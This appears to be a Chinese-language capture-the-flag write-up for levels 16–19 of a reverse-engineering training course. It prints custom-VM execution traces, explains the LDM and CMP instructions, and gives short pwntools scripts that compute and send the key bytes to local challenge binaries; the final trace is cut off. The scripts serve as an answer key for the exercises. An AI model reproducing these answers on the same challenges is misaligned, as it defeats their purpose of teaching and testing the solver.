<h1 id="16-0-x2F-16-1"><a href="#16-0-x2F-16-1" class="headerlink" title="16.0&#x2F;16.1"></a>16.0&#x2F;16.1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[s] IMM b = 0x3d</span><br><span class="line">[s] IMM c = 0x4</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[s] SYS 0x20 a</span><br><span class="line">[s] ... read_memory</span><br><span class="line">c</span><br><span class="line">[s] ... return value (in register a): 0x2</span><br><span class="line">[s] IMM b = 0x5d</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0x6e</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x34</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x41</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xd</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM b = 0x5d</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x3d</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x5e</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x3e</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x5f</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x3f</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x60</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x40</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] IMM b = 0</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM d = 0x49</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">I[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x4e</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">N[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x43</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">C[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x4f</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">O[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x52</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">R[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x52</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">R[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x45</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">E[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x43</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">C[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x54</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">T[s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM d = 0x21</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line">![s] ... return value (in register a): 0x1</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] IMM d = 0xa</span><br><span class="line">[s] STM *b = d</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... write</span><br><span class="line"></span><br><span class="line">[s] ... return value (in register a): 0x1</span><br><span class="line">[s] SYS 0x1 a</span><br><span class="line">[s] ... exit</span><br></pre></td></tr></table></figure>

<p>这里又多了几个指令，LDM,CMP,</p>
<p>ldm是加载寄存器指向的值，相当于mov a,[b]</p>
<p>cmp是设置状态位，状态为在a[262]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小于3</span><br><span class="line">大于4</span><br><span class="line">相等5</span><br><span class="line">不等1</span><br><span class="line">都是0的状态位为2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( (*(a1 + 262) &amp; 0x10) == 0 )</span><br><span class="line">  v2 = 0;</span><br></pre></td></tr></table></figure>

<p>会检查b的5d-5f是否分别和a的3d-3f相等</p>
<p>我们期望是相等的</p>
<p>这里其实依旧是判断是否相等</p>
<h1 id="17-0-x2F-17-1"><a href="#17-0-x2F-17-1" class="headerlink" title="17.0&#x2F;17.1"></a>17.0&#x2F;17.1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[s] IMM b = 0x6b</span><br><span class="line">[s] IMM c = 0xc</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... read_memory</span><br><span class="line">123</span><br><span class="line">[s] ... return value (in register a): 0x4</span><br><span class="line">[s] IMM b = 0x8b</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0xbf</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xd</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x4d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x6a</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xda</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xe6</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xed</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xa7</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x15</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x81</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM b = 0x8b</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xad</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0x84</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xfc</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0x5e</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xc7</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xb0</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xf2</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0x93</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0x62</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xcc</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0x16</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] LDM a = *b</span><br><span class="line">[s] IMM d = 0xe2</span><br><span class="line">[s] ADD a d</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM b = 0x8b</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x6b</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x8c</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x6c</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x8d</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x6d</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x8e</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x6e</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x8f</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x6f</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x90</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x70</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x91</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x71</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x92</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x72</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x93</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x73</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x94</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x74</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x95</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x75</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x96</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM a = 0x76</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] IMM b = 0</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM d = 0x49</span><br><span class="line">[s] STM *b = d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">r = process(&quot;/challenge/babyrev_level17.1&quot;)</span><br><span class="line"></span><br><span class="line">data = bytearray(b&quot;\xb3\xd0\x9f\x4d\x05\xb2&quot;)</span><br><span class="line">data2 = bytearray(b&quot;\x05\x30\x3f\x91\xd3\xd8&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(0, 6):</span><br><span class="line">    data[i] = (data[i] + data2[i]) &amp; 0xFF</span><br><span class="line"></span><br><span class="line">r.send(data)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="18-0-x2F-18-1"><a href="#18-0-x2F-18-1" class="headerlink" title="18.0&#x2F;18.1"></a>18.0&#x2F;18.1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[s] IMM b = 0x5b</span><br><span class="line">[s] IMM c = 0xc</span><br><span class="line">[s] IMM a = 0</span><br><span class="line">[s] SYS 0x2 a</span><br><span class="line">[s] ... read_memory</span><br><span class="line">123</span><br><span class="line">[s] ... return value (in register a): 0x4</span><br><span class="line">[s] IMM b = 0x7b</span><br><span class="line">[s] IMM c = 0x1</span><br><span class="line">[s] IMM a = 0x7</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xec</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xd1</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xdf</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x76</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x25</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x58</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x6c</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5b</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0xa8</span><br><span class="line">[s] STM *b = a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM b = 0x7b</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x18</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5b</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x7c</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x38</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5c</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x7d</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0xb9</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5d</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x7e</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x44</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5e</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x7f</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x51</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x5f</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x80</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x8e</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x60</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x81</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x2a</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x61</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x82</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x8c</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x62</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x83</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x26</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x63</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x84</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x60</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x64</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x85</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0x24</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x65</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br><span class="line">[s] IMM b = 0x86</span><br><span class="line">[s] LDM b = *b</span><br><span class="line">[s] IMM c = 0xca</span><br><span class="line">[s] ADD b c</span><br><span class="line">[s] IMM a = 0x66</span><br><span class="line">[s] LDM a = *a</span><br><span class="line">[s] CMP a b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">r = process(&quot;/challenge/babyrev_level18.0&quot;)</span><br><span class="line"></span><br><span class="line">data = bytearray(b&quot;\x07\x01\x05\xec\xd1\xdf\x76\x25\x58\x6c\x5b\xa8&quot;)</span><br><span class="line">data2 = bytearray(b&quot;\x18\x38\xb9\x44\x51\x8e\x2a\x8c\x26\x60\x24\xca&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    data[i] = (data[i] + data2[i]) &amp; 0xFF</span><br><span class="line"></span><br><span class="line">r.send(data)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>相较于17，本关不过是改变了程序逻辑，将原本先相加再判断改成了边加边判断</p>
<h1 id="19-0"><a href="#19-0" class="headerlink" title="19.0"></a>19.0</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Starting interpreter loop! Good luck!</span><br><span class="line">[V] a:0 b:0 c:0 d:0 s:0 i:0x1 f:0</span><br><span class="line">[I] op:0x2 arg1:0x20 arg2:0xb8</span><br><span class="line">[s] IMM i = 0xb8</span><br><span class="line">[V] a:0 b:0 c:0 d:0 s:0 i:0xb9 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0xeb</span><br><span class="line">[s] IMM d = 0xeb</span><br><span class="line">[V] a:0 b:0 c:0 d:0xeb s:0 i:0xba f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x77</span><br><span class="line">[s] IMM c = 0x77</span><br><span class="line">[V] a:0 b:0 c:0x77 d:0xeb s:0 i:0xbb f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x77 d:0xeb s:0 i:0xbc f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0xd9</span><br><span class="line">[s] IMM d = 0xd9</span><br><span class="line">[V] a:0 b:0 c:0x77 d:0xd9 s:0 i:0xbd f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x78</span><br><span class="line">[s] IMM c = 0x78</span><br><span class="line">[V] a:0 b:0 c:0x78 d:0xd9 s:0 i:0xbe f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x78 d:0xd9 s:0 i:0xbf f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0xce</span><br><span class="line">[s] IMM d = 0xce</span><br><span class="line">[V] a:0 b:0 c:0x78 d:0xce s:0 i:0xc0 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x79</span><br><span class="line">[s] IMM c = 0x79</span><br><span class="line">[V] a:0 b:0 c:0x79 d:0xce s:0 i:0xc1 f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x79 d:0xce s:0 i:0xc2 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0xdd</span><br><span class="line">[s] IMM d = 0xdd</span><br><span class="line">[V] a:0 b:0 c:0x79 d:0xdd s:0 i:0xc3 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x7a</span><br><span class="line">[s] IMM c = 0x7a</span><br><span class="line">[V] a:0 b:0 c:0x7a d:0xdd s:0 i:0xc4 f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x7a d:0xdd s:0 i:0xc5 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x46</span><br><span class="line">[s] IMM d = 0x46</span><br><span class="line">[V] a:0 b:0 c:0x7a d:0x46 s:0 i:0xc6 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x7b</span><br><span class="line">[s] IMM c = 0x7b</span><br><span class="line">[V] a:0 b:0 c:0x7b d:0x46 s:0 i:0xc7 f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x7b d:0x46 s:0 i:0xc8 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x10</span><br><span class="line">[s] IMM d = 0x10</span><br><span class="line">[V] a:0 b:0 c:0x7b d:0x10 s:0 i:0xc9 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x7c</span><br><span class="line">[s] IMM c = 0x7c</span><br><span class="line">[V] a:0 b:0 c:0x7c d:0x10 s:0 i:0xca f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x7c d:0x10 s:0 i:0xcb f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x9e</span><br><span class="line">[s] IMM d = 0x9e</span><br><span class="line">[V] a:0 b:0 c:0x7c d:0x9e s:0 i:0xcc f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x7d</span><br><span class="line">[s] IMM c = 0x7d</span><br><span class="line">[V] a:0 b:0 c:0x7d d:0x9e s:0 i:0xcd f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x7d d:0x9e s:0 i:0xce f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x44</span><br><span class="line">[s] IMM d = 0x44</span><br><span class="line">[V] a:0 b:0 c:0x7d d:0x44 s:0 i:0xcf f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x7e</span><br><span class="line">[s] IMM c = 0x7e</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0 i:0xd0 f:0</span><br><span class="line">[I] op:0x8 arg1:0x1 arg2:0x8</span><br><span class="line">[s] STM *c = d</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0 i:0xd1 f:0</span><br><span class="line">[I] op:0x2 arg1:0x20 arg2:0x98</span><br><span class="line">[s] IMM i = 0x98</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0 i:0x99 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x4</span><br><span class="line">[s] STK NONE a</span><br><span class="line">[s] ... pushing a</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0x1 i:0x9a f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x10</span><br><span class="line">[s] STK NONE b</span><br><span class="line">[s] ... pushing b</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0x2 i:0x9b f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x1</span><br><span class="line">[s] STK NONE c</span><br><span class="line">[s] ... pushing c</span><br><span class="line">[V] a:0 b:0 c:0x7e d:0x44 s:0x3 i:0x9c f:0</span><br><span class="line">[I] op:0x2 arg1:0x10 arg2:0x1</span><br><span class="line">[s] IMM b = 0x1</span><br><span class="line">[V] a:0 b:0x1 c:0x7e d:0x44 s:0x3 i:0x9d f:0</span><br><span class="line">[I] op:0x40 arg1:0x10 arg2:0x2</span><br><span class="line">[s] ADD b s</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x44 s:0x3 i:0x9e f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x4b</span><br><span class="line">[s] IMM d = 0x4b</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x4b s:0x3 i:0x9f f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x8</span><br><span class="line">[s] STK NONE d</span><br><span class="line">[s] ... pushing d</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x4b s:0x4 i:0xa0 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x45</span><br><span class="line">[s] IMM d = 0x45</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x45 s:0x4 i:0xa1 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x8</span><br><span class="line">[s] STK NONE d</span><br><span class="line">[s] ... pushing d</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x45 s:0x5 i:0xa2 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x59</span><br><span class="line">[s] IMM d = 0x59</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x59 s:0x5 i:0xa3 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x8</span><br><span class="line">[s] STK NONE d</span><br><span class="line">[s] ... pushing d</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x59 s:0x6 i:0xa4 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x3a</span><br><span class="line">[s] IMM d = 0x3a</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x3a s:0x6 i:0xa5 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x8</span><br><span class="line">[s] STK NONE d</span><br><span class="line">[s] ... pushing d</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x3a s:0x7 i:0xa6 f:0</span><br><span class="line">[I] op:0x2 arg1:0x8 arg2:0x20</span><br><span class="line">[s] IMM d = 0x20</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x20 s:0x7 i:0xa7 f:0</span><br><span class="line">[I] op:0x10 arg1:0 arg2:0x8</span><br><span class="line">[s] STK NONE d</span><br><span class="line">[s] ... pushing d</span><br><span class="line">[V] a:0 b:0x4 c:0x7e d:0x20 s:0x8 i:0xa8 f:0</span><br><span class="line">[I] op:0x2 arg1:0x1 arg2:0x5</span><br><span class="line">[s] IMM c = 0x5</span><br><span class="line">[V] a:0 b:0x4 c:0x5 d:0x20 s:0x8 i:0xa9 f:0</span><br><span class="line">[I] op:0x2 arg1:0x4 arg2:0x1</span><br><span class="line">[s] IMM a = 0x1</span><br><span class="line">[V] a:0x1 b:0x4 c:0x5 d:0x20 s:0x8 i:0xaa f:0</span><br><span class="line">[I] op:0x80 arg1:0x20 arg2:0x8</span><br><span class="line">[s] SYS 0x20 d</span><br><span class="line">[s] ... write</span><br><span class="line">KEY: [s] ... return value (in register d): 0x5</span><br><span class="line">[V] a:0x1 b:0x4 c:0x5 d:0x5 s:0x8 i:0xab f:0</span><br><span class="line">[I] op:0x10 arg1:0x1 arg2:0</span><br><span class="line">[s] STK c NONE</span><br><span class="line">[s] ... popping c</span><br><span class="line">[V] a:0x1 b:0x4 c:0x20 d:0x5 s:0x7 i:0xac f:0</span><br><span class="line">[I] op:0x10 arg1:0x10 arg2:0</span><br><span class="line">[s] STK b NONE</span><br><span class="line">[s] ... popping b</span><br><span class="line">[V] a:0x1 b:0x3a c:0x20 d:0x5 s:0x6 i:0xad f:0</span><br><span class="line">[I] op:0x10 arg1:0x4 arg2:0</span><br><span class="line">[s] STK a NONE</span><br><span class="line">[s] ... popping a</span><br><span class="line">[V] a:0x59 b:0x3a c:0x20 d:0x5 